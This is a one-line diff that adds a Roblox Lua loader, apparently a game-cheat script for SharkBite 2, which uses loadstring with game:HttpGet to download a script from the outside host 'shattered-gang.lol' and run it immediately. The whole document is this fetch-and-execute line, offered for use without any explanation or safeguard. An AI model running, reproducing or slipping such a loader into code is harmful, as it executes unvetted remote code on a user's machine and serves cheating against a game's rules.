@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://shattered-gang.lol/scripts/sharkbite_2.lua"))()
